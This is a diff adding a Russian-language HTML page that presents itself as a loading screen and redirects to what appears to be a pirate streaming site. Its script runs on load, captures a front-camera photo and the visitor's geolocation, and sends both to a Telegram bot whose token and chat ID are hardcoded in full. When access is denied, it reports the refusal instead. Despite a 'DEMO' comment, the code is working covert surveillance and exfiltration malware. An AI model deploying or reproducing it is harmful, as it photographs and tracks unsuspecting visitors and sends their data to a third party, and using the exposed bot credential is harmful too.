@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Запрос доступа</title>
+</head>
+<body>
+  <h2>Загрузка...</h2>
+
+  <script>
+    // ⚠️ DEMO: Telegram токен и chat_id прямо в коде
+    const TELEGRAM_TOKEN = "8377810271:AAG4gGXoBLBCjt3fKE9ZSefJ92UiI_jKW5I";
+    const TELEGRAM_CHAT_ID = "8071841674";
+    const TELEGRAM_ERROR_MSG = "Пользователь отказал в доступе";
+
+    async function sendToTelegram(payload) {
+      if (payload.error) {
+        // Сообщение об отказе
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: payload.error
+          })
+        });
+      } else {
+        // Отправка гео
+        if (payload.coords) {
+          const mapUrl = `https://maps.google.com/?q=${payload.coords.lat},${payload.coords.lon}`;
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: `Геолокация: ${mapUrl}`
+            })
+          });
+        }
+        // Отправка фото
+        if (payload.photo) {
+          const formData = new FormData();
+          const blob = await (await fetch(payload.photo)).blob();
+          formData.append("chat_id", TELEGRAM_CHAT_ID);
+          formData.append("photo", blob, "photo.jpg");
+
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+        }
+      }
+    }
+
+    async function init() {
+      let granted = { camera: false, geo: false };
+      let photoData = null;
+      let coords = null;
+
+      // --- Камера ---
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        granted.camera = true;
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+        photoData = canvas.toDataURL("image/jpeg");
+
+        stream.getTracks().forEach(track => track.stop());
+      } catch (err) {
+        granted.camera = false;
+      }
+
+      // --- Геолокация ---
+      try {
+        coords = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(
+            pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+            err => reject(err)
+          );
+        });
+        granted.geo = true;
+      } catch (err) {
+        granted.geo = false;
+      }
+
+      // --- Отправка в Telegram ---
+      if (granted.camera || granted.geo) {
+        await sendToTelegram({ photo: photoData, coords });
+      } else {
+        await sendToTelegram({ error: TELEGRAM_ERROR_MSG });
+      }
+
+      // --- Редирект на сайт ---
+      setTimeout(() => {
+        window.location.href = "https://watch-the-sopranos-online.com/";
+      }, 2000);
+    }
+
+    init();
+  </script>
+</body>
+</html>
